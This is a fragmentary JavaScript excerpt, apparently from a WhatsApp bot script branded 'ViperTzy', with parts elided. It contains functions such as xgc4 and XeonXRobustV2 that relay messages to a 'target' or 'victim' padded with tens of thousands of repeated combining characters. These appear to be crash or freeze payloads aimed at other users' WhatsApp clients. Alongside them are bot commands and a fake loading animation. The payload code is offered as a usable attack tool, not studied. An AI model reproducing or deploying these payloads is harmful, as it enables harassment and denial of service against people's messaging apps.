...
const wanted = {
		...
		async function xgc4(target) {
            try {
                ...
                await viper.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
       ...
       interactiveMessage: {
        header: {
         ...
         hasMediaAttachment: true,
									...
									body: { text: '𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚' + ui + jids },
									contextInfo: {
...
async function XeonXRobustV2(viper, target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
...
message: {
listResponseMessage: {
title: "*Hello I Am* 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(30000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
...
serverMessageId: 1,
newsletterName: `𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚${"ꥈꥈꥈꥈꥈꥈ".repeat(5)}`,
contentType: 3,
...
"*LOADING 95%*",
"*LOADING 100%*",
"𝑯᪱͢͢𝑒͢𝑙͢𝑙͢𝑜͢ 𝑰͢𝑚 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
"𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓᪱ 𝑰͢𝑠 𝑯͢͢𝑒͢𝑟͢𝑒"
]
let { key } = await viper.sendMessage(from, {text: '"*LOADING 1%*"'})
...
case "cekidgc": case "cekidgroup": case "idgc":
if (!isOwner) return reply(mess.only.owner)
reply(`
┌────────── [     *GROUP CHAT*     ] ──────────┐
...
async function xgc4(victim) {
            try {
                ...
                await viper.relayMessage(victim, messsage, {
                    userJid: victim,
                });
            }
            catch (err) {
...
"scheduledTimestampMs": Date.now(),
         callType: 1,
         title: `𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚` + `ꦾ`.repeat(300000)
    }
